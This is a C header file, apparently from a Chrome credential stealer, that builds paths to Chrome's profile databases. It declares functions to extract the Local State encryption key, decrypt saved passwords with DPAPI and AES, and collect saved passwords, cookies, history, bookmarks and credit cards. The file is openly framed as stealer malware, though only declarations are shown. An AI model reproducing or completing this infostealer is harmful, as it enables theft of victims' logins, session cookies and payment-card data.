#ifndef __CHROME_STEALER__
#define __CHROME_STEALER__
#include <wincrypt.h>
#include <sqlite3.h>
#define MAX_PATH_LENGTH 260 // Maximum path length

#define CHROME_PATH(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data", getenv("USERPROFILE"));
#define CHROME_PATH_LOCAL_STATE(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", getenv("USERPROFILE"));
#define CHROME_PATH_COOKIES(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", getenv("USERPROFILE"));
#define CHROME_PATH_HISTORY(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", getenv("USERPROFILE"));
#define CHROME_PATH_BOOKMARKS(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", getenv("USERPROFILE"));
#define CHROME_PATH_CREDIT_CARDS(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data", getenv("USERPROFILE"));

//========= Copy Files from one folder to another folder ==========//
int copyFile(const char* sourcePath, const char* destinationPath);

//========= Gives the Database connection of the file    ==========//
sqlite3* getDBConnection(const char* chromePathLoginDB);

// ======== Function to get secret key from the Local State file===//
int GetSecretKey(const char* localStatePath, DATA_BLOB* dataOut);

// ======== Decrypt passwrod from local state file ================//
BYTE* DecryptPassword(DATA_BLOB CipherData, DATA_BLOB SecretKey);

// ======== AES decryption implementation =========================//
BYTE * Decrypt_AES(const unsigned char *secret_key, const unsigned char *initialization_vector, const unsigned char *encrypted_password, size_t encrypted_length);

//========= Gives the chrome saved passwords ======================//
char* GetChromeSavedPasswords();

//========= Gives the chrome saved cookies. =======================//
char* GetChromeSavedCookies();

//========= Gives the chrome saved History. =======================//
char* GetChromeSavedHistory();

//========= Gives the chrome saved Bookmarks. =====================//
char* GetChromeSavedBookmarks();

//========= Gives the chrome saved Credit cards. =====================//
char* GetChromeSavedCreditcards();

#endif